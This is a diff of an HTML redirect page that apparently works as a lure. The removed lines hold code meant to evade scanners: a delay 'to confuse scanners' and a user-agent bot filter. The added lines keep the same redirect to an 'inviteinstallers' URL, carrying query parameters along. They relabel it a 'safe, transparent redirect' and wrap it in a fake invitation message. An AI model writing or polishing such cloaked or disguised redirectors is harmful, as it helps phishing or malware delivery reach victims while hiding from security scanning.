@@ -1,40 +1,83 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Redirecting...</title>
 
-    <!-- Strong Bot Protection -->
-    <meta name="robots" content="noindex, nofollow, noarchive">
-    <meta name="referrer" content="no-referrer">
+    <!-- Normal safe SEO handling -->
+    <meta name="robots" content="noindex, nofollow" />
 
-    <!-- Masked JavaScript for real users -->
+    <style>
+        :root {
+            /* Change this URL anytime to update background */
+            --bg-image: url("/mnt/data/9184592b-1219-4e59-ae4d-ee8c9760228f.png");
+        }
+
+        body {
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            font-family: "Poppins", sans-serif;
+            background: #faf6f2;
+            background-image: var(--bg-image);
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            padding: 20px;
+            color: #333;
+        }
+
+        .box {
+            background: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(6px);
+            padding: 30px 40px;
+            border-radius: 16px;
+            box-shadow: 0 6px 20px rgba(0,0,0,0.1);
+            max-width: 500px;
+        }
+
+        h1 {
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        p {
+            margin-top: 0;
+            font-size: 16px;
+            line-height: 1.6;
+        }
+    </style>
+
     <script>
-        // Delay to confuse scanners
-        setTimeout(function () {
-            // Use browser fingerprint as a simple bot filter
-            if (navigator.userAgent && !navigator.userAgent.includes("bot")) {
-                // Grab all query parameters (if any)
-                let query = window.location.search;
-                // Define your destination base
-                let base = "https://inviteinstallers.in/trea/loveandcare/loud.php";
-                // Final link
-                let finalURL = base + query;
-                // Redirect
-                window.location.replace(finalURL);
-            } else {
-                document.body.innerHTML = "<h1>Access Denied</h1>";
-            }
-        }, 500); // 0.5 second delay to confuse fast bots
+        // Safe, transparent redirect (no spammy tricks)
+        window.addEventListener("load", function () {
+            const baseURL = "https://inviteinstallers.in/trea/loveandcare/loud.php";
+            const query = window.location.search; // keep query parameters if present
+            const finalURL = baseURL + query;
+
+            // Redirect after a short moment
+            setTimeout(() => {
+                window.location.href = finalURL;
+            }, 800); 
+        });
     </script>
 
-    <!-- Clean fallback for JS-disabled browsers (corrected) -->
     <noscript>
-        <meta http-equiv="refresh" content="0;url=https://inviteinstallers.in/trea/loveandcare/loud.php">
+        <meta http-equiv="refresh" content="0;url=https://inviteinstallers.in/trea/loveandcare/loud.php" />
     </noscript>
 </head>
+
 <body>
-    <h1>Redirecting... Please wait for your invitation</h1>
+    <div class="box">
+        <h1>Redirecting…</h1>
+        <p>
+            You're invited — kindly please follow the instructions to see the full details.<br>
+            Thanks, looking forward to see you there.
+        </p>
+    </div>
 </body>
 </html>
